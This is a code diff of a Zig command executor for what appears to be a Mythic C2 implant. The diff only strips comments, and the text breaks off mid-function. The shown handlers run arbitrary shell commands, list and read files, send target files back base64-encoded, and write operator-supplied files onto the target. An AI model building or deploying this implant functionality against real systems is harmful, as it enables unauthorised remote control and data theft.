@@ -17,7 +17,6 @@ pub const CommandExecutor = struct {
         };
     }
     
-    // Execute individual task based on command
     pub fn executeTask(self: *CommandExecutor, task: MythicTask) !MythicResponse {
         if (std.mem.eql(u8, task.command, "shell")) {
             return try self.executeShell(task);
@@ -41,7 +40,6 @@ pub const CommandExecutor = struct {
         }
     }
     
-    // Execute shell command
     fn executeShell(self: *CommandExecutor, task: MythicTask) !MythicResponse {
         const ShellParameters = struct {
             command: []const u8,
@@ -82,7 +80,6 @@ pub const CommandExecutor = struct {
         };
     }
     
-    // Get current working directory
     fn executePwd(self: *CommandExecutor, task: MythicTask) !MythicResponse {
         const cwd = std.process.getCwdAlloc(self.allocator) catch |err| {
             return MythicResponse{
@@ -101,7 +98,6 @@ pub const CommandExecutor = struct {
         };
     }
     
-    // List directory contents
     fn executeLs(self: *CommandExecutor, task: MythicTask) !MythicResponse {
         const Parameters = struct {
             path: []const u8 = ".",
@@ -139,7 +135,6 @@ pub const CommandExecutor = struct {
         };
     }
 
-    // Read file contents
     fn executeCat(self: *CommandExecutor, task: MythicTask) !MythicResponse {
         if (task.parameters.len == 0) {
             return MythicResponse{
@@ -167,7 +162,6 @@ pub const CommandExecutor = struct {
         };
     }
     
-    // Download file from target
     fn executeDownload(self: *CommandExecutor, task: MythicTask) !MythicResponse {
         const file_content = std.fs.cwd().readFileAlloc(self.allocator, task.parameters, 10 * 1024 * 1024) catch |err| {
             return MythicResponse{
@@ -179,7 +173,6 @@ pub const CommandExecutor = struct {
         };
         defer self.allocator.free(file_content);
         
-        // Base64 encode the file content
         const encoder = base64.standard.Encoder;
         const encoded_size = encoder.calcSize(file_content.len);
         const encoded_content = try self.allocator.alloc(u8, encoded_size);
@@ -194,9 +187,7 @@ pub const CommandExecutor = struct {
         };
     }
     
-    // Upload file to target
     fn executeUpload(self: *CommandExecutor, task: MythicTask) !MythicResponse {
-        // Parse parameters for filename and base64 content
         const parsed = json.parseFromSlice(json.Value, self.allocator, task.parameters, .{}) catch {
             return MythicResponse{
                 .task_id = task.id,
@@ -210,7 +201,6 @@ pub const CommandExecutor = struct {
         const filename = parsed.value.object.get("filename").?.string;
         const b64_content = parsed.value.object.get("content").?.string;
         
-        // Decode base64 content
         const decoder = base64.standard.Decoder;
         const decoded_size = try decoder.calcSizeForSlice(b64_content);
         const decoded_content = try self.allocator.alloc(u8, decoded_size);
@@ -218,7 +208,6 @@ pub const CommandExecutor = struct {
         
         try decoder.decode(decoded_content, b64_content);
         
-        // Write file
         std.fs.cwd().writeFile(.{ .sub_path = filename, .data = decoded_content }) catch |err| {
             return MythicResponse{
                 .task_id = task.id,
